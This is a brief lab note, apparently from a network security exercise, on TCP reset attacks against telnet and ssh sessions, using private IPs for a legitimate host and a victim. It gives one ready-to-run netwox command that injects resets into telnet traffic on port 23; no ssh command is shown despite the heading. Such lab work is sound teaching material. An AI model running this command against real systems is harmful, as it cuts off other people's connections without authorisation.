## TCP RST Attacks on `telnet` and `ssh`

assuming leg IP: `10.0.0.2`, vic IP: `10.0.0.3`

The `netwox` commands are as follow:

```bash
netwox 78 --filter "host 10.0.0.2 and host 10.0.0.3 and port 23" --src-ip 10.0.0.2 --dst-ip 10.0.0.3
```
